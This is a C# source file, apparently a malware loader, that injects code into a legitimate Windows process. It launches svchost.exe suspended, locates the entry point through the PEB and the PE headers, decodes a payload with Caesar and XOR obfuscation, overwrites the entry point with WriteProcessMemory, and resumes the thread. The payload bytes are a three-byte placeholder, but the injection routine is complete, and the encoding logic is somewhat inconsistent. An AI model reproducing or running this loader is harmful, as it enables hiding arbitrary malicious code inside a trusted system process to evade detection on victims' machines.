using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms.VisualStyles;
using System.Linq;



[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

// Définir la structure PROCESS_INFORMATION
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

// Définir la structure PROCESS_BASIC_INFORMATION
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved;
    public IntPtr PebBaseAddress;
    public uint AffinityMask;
    public uint BasePriority;
    public uint EntryPoint;
    public uint ThreadCount;
}
class Program
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
    uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    public static void Main(string[] args)
    {
        STARTUPINFO hprocSTARTUPINFO = new STARTUPINFO();
        PROCESS_INFORMATION hprocPROCESS_INFORMATION = new PROCESS_INFORMATION();
        PROCESS_BASIC_INFORMATION hprocBASIC_INFORMATION = new PROCESS_BASIC_INFORMATION();
        uint hprocRETLENGTH = 0;
        Boolean hprocess = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref hprocSTARTUPINFO, out hprocPROCESS_INFORMATION);

        IntPtr hprocPROCESS = hprocPROCESS_INFORMATION.hProcess;
        int hprocZQUERY = ZwQueryInformationProcess(hprocPROCESS, 0, ref hprocBASIC_INFORMATION, (uint)(IntPtr.Size * 6), ref hprocRETLENGTH);
        

        IntPtr hprocBASEADDRESS = (IntPtr)((Int64)hprocBASIC_INFORMATION.PebBaseAddress + 0x10);
        byte[] bufferaddr = new byte[200];
        IntPtr nmbrbytes = new IntPtr();
        bool hprocBASEPTR = ReadProcessMemory(hprocPROCESS, hprocBASEADDRESS, bufferaddr, bufferaddr.Length, out nmbrbytes);

        UInt32 hprocELFANEWOFFSET = BitConverter.ToUInt32(bufferaddr, 0x3C);

        UInt32 hprocoffsetrva = hprocELFANEWOFFSET + 0x28;

        UInt32 entry_rva = BitConverter.ToUInt32(bufferaddr, (int)hprocoffsetrva);

        IntPtr hprocENTRYPOINT = (IntPtr)(entry_rva + (UInt64)hprocBASEADDRESS);

        byte[] buffer = new byte[3] { 0xA4, 0xA4, 0xA4 };

        byte[] caesardecode = new byte[buffer.Length];

        for (int i = 0; i < buffer.Length; i++)
        {
            caesardecode[i] = (byte)(((uint)buffer[i] - 20) & 0xFF );
        }
        Console.WriteLine("cipherpayload = new byte[" + caesardecode.Length + "] { " + string.Join(", ", caesardecode.Select(b => $"0x{b:X2}")) + " };");

        string key = "Key for xoring the payload";

        byte[] decodedcipher = new byte[buffer.Length];


        for (int i = 0; i < buffer.Length; i++)
        {
            decodedcipher[i] = (byte)(buffer[i] ^ key[i % key.Length]);
        }

        int bufferSize = buffer.Length;
        IntPtr exploitbyteswritten = new IntPtr();

        bool exploitbuffer = WriteProcessMemory(hprocPROCESS, hprocENTRYPOINT, decodedcipher, bufferSize, out exploitbyteswritten);

        if (exploitbuffer)
        {
            uint thread = ResumeThread(hprocPROCESS_INFORMATION.hThread);

        }
        else
        {
            Console.WriteLine("Le thread n'a pas pu etre lancer vers le processus");
            return;
        }

    }

}
